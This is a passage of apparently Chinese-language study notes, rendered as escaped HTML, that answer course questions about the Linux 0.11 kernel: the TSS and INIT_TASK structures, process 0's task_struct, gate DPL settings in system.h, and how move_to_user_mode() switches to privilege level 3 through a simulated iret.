class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; INIT_TASK \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*tss*/&lt;/span&gt;	&amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,PAGE_SIZE+(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)&amp;amp;init_task,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,(&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)&amp;amp;pg_dir,\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	 &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	 _LDT(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;0x80000000&lt;/span&gt;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#123;&amp;#125; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;, \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;tss_struct&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	back_link;	&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	esp0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ss0;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	esp1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ss1;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	esp2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ss2;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	cr3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	eip;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	eflags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	eax,ecx,edx,ebx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	esp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ebp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	esi;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	edi;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	es;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	cs;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ss;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ds;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	fs;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	gs;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	ldt;		&lt;span class=&#34;comment&#34;&gt;/* 16 high bits zero */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;	trace_bitmap;	&lt;span class=&#34;comment&#34;&gt;/* bits: trace 0, bitmap 16-31 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;i387_struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;i387&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;14-进程0的task-struct在哪？具体内容是什么？给出代码证据。&#34;&gt;&lt;a href=&#34;#14-进程0的task-struct在哪？具体内容是什么？给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;14.进程0的task_struct在哪？具体内容是什么？给出代码证据。&#34;&gt;&lt;/a&gt;14.进程0的task_struct在哪？具体内容是什么？给出代码证据。&lt;/h1&gt;&lt;p&gt;init&amp;#x2F;main.c sched_init();&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;sched.c &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sched_init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//调度程序的初始化子程序 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;desc_struct&lt;/span&gt; * &lt;span class=&#34;title&#34;&gt;p&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; sigaction) != &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		panic(&lt;span class=&#34;string&#34;&gt;&amp;quot;Struct sigaction MUST be 16 bytes&amp;quot;&lt;/span&gt;);  &lt;span class=&#34;comment&#34;&gt;//致命错误&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	set_tss_desc(gdt+FIRST_TSS_ENTRY,&amp;amp;(init_task.task.tss)); &lt;span class=&#34;comment&#34;&gt;// 设置初始任务（任务 0）的任务状态段描述符和局部数据表描述符(include/asm/system.h,65)。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	set_ldt_desc(gdt+FIRST_LDT_ENTRY,&amp;amp;(init_task.task.ldt));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;init_task&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;task_union&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;init_task&lt;/span&gt; =&lt;/span&gt; &amp;#123;INIT_TASK,&amp;#125;; &lt;span class=&#34;comment&#34;&gt;// 这里进行类型转换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;15-在system-h里读懂代码。这里中断门、陷阱门、系统调用都是通过-set-gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。&#34;&gt;&lt;a href=&#34;#15-在system-h里读懂代码。这里中断门、陷阱门、系统调用都是通过-set-gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。&#34; class=&#34;headerlink&#34; title=&#34;15.在system.h里读懂代码。这里中断门、陷阱门、系统调用都是通过_set_gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。&#34;&gt;&lt;/a&gt;15.在system.h里读懂代码。这里中断门、陷阱门、系统调用都是通过_set_gate设置的，用的是同一个嵌入汇编代码，比较明显的差别是dpl一个是3，另外两个是0，这是为什么？说明理由。&lt;/h1&gt;&lt;p&gt;p51&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _set_gate(gate_addr,type,dpl,addr) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__ (&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%dx,%%ax\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;//实现了偏移的拆分&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %0,%%dx\n\t&amp;quot;&lt;/span&gt; \        &lt;span class=&#34;comment&#34;&gt;//将偏移的低字给dx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%eax,%1\n\t&amp;quot;&lt;/span&gt; \         &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%edx,%2&amp;quot;&lt;/span&gt; \            &lt;span class=&#34;comment&#34;&gt;//差四字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: &lt;span class=&#34;string&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;short&lt;/span&gt;) (&lt;span class=&#34;number&#34;&gt;0x8000&lt;/span&gt;+(dpl&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;)+(type&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))), \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;o&amp;quot;&lt;/span&gt; (*((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) (gate_addr))), \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;o&amp;quot;&lt;/span&gt; (*(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) (gate_addr))), \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) (addr)),&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0x00080000&lt;/span&gt;))  &lt;span class=&#34;comment&#34;&gt;// jump 08》???&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置中断门函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_intr_gate(n,addr) \  &lt;span class=&#34;comment&#34;&gt;// n 中断号 addr 中断程序偏移地址&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	_set_gate(&amp;amp;idt[n],&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,addr)  &lt;span class=&#34;comment&#34;&gt;//&amp;amp;idt[n]对应中断号在中断描述符表中的偏移值；中断描述符的类型是 14，特权级是 0。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置陷阱门函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_trap_gate(n,addr) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	_set_gate(&amp;amp;idt[n],15,0,addr) &lt;span class=&#34;comment&#34;&gt;// idt表的n项,f,0, 0对应dpl,15对应type ,以二进制来看到&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置系统调用门函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_system_gate(n,addr) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	_set_gate(&amp;amp;idt[n],15,3,addr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里也是特权级保护的思想, 大概申请者用于大于该东西的特权级才能访问(具体的比这个复杂, 参加IA32 第三卷)&lt;/p&gt;
&lt;p&gt;set_system_gate是3,意思是系统调用可以由3特权级(即用户特权级)进行调用,其余两个为0的意思是只能由内核处理,禁止用户进程进行调用,这样就起到了保护系统的作用&lt;/p&gt;
&lt;h1 id=&#34;16-进程0-fork进程1之前，为什么先调用move-to-user-mode-？用的是什么方法？解释其中的道理。&#34;&gt;&lt;a href=&#34;#16-进程0-fork进程1之前，为什么先调用move-to-user-mode-？用的是什么方法？解释其中的道理。&#34; class=&#34;headerlink&#34; title=&#34;16.进程0 fork进程1之前，为什么先调用move_to_user_mode()？用的是什么方法？解释其中的道理。&#34;&gt;&lt;/a&gt;16.进程0 fork进程1之前，为什么先调用move_to_user_mode()？用的是什么方法？解释其中的道理。&lt;/h1&gt;&lt;p&gt;p78 &lt;/p&gt;
&lt;h2 id=&#34;为什么要调用move-to-user-mode&#34;&gt;&lt;a href=&#34;#为什么要调用move-to-user-mode&#34; class=&#34;headerlink&#34; title=&#34;为什么要调用move_to_user_mode()?&#34;&gt;&lt;/a&gt;为什么要调用move_to_user_mode()?&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;    因为Linux操作系统规定,除了进程0之外,所有进程都要由一个已有进程在3特权级下进行创建,所以进程0在fork进程1之前,要先从0特权级翻转到3特权级
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Linux0.11是通过move_to_user_mode(),模仿中断返回动作,实现从0特权级转变为3特权级  &lt;/p&gt;
&lt;h2 id=&#34;方法-怎么实现翻转呢&#34;&gt;&lt;a href=&#34;#方法-怎么实现翻转呢&#34; class=&#34;headerlink&#34; title=&#34;方法(怎么实现翻转呢?&#34;&gt;&lt;/a&gt;方法(怎么实现翻转呢?&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;    IA32体系结构翻转特权级的方法之一是中断,进入中断的时候由3转0,返回的时候由0转3. int指令会引发CPU硬件完成SS、ESP、EFLAGS、CS、EIP的值按顺序进栈,返回时CPU执行iret指令会将栈中的值自动按反序恢复给这五个寄存器

    既然要模拟中断返回,那么就需要模拟int(中断)时的压栈,就是前面5个push,最后调用iret进行返回,将SS,ESP,EFLAGS,CS,EIP按顺序交给CPU,CPU此时就翻转到了3特权级(具体的呢??)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;代码-1&#34;&gt;&lt;a href=&#34;#代码-1&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h2&gt;&lt;p&gt;include&amp;#x2F;asm&amp;#x2F;system.h&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; move_to_user_mode() \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__ (&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%esp,%%eax\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;pushl $0x17\n\t&amp;quot;&lt;/span&gt; \  &lt;span class=&#34;comment&#34;&gt;//SS 0x17 =  10(第三项)1(ldt)11(特权级3 )  代替inc int? 这是个段值,用户程序数据段   由0特权变为3特权 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;pushl %%eax\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;//里面就是esp    对的,看第一句&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;pushfl\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;pushl $0x0f\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;// 0000000000001111 最后两位11(特权级3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;pushl $1f\n\t&amp;quot;&lt;/span&gt; \ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;iret\n&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;// 中断返回 (与中断不配套其实,单独出现的一个返回,前面是一个模拟中断)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;1:\tmovl $0x17,%%eax\n\t&amp;quot;&lt;/span&gt; \   &lt;span class=&#34;comment&#34;&gt;//开始3特权级  切3态的话  为什么说切到task0了? ldtr tr-&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%ax,%%ds\n\t&amp;quot;&lt;/span&gt; \         &lt;span class=&#34;comment&#34;&gt;// 进程0代码      分页的时候 + 7、 task数组,都可以说明是进程0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%ax,%%es\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%ax,%%fs\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%ax,%%gs&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span 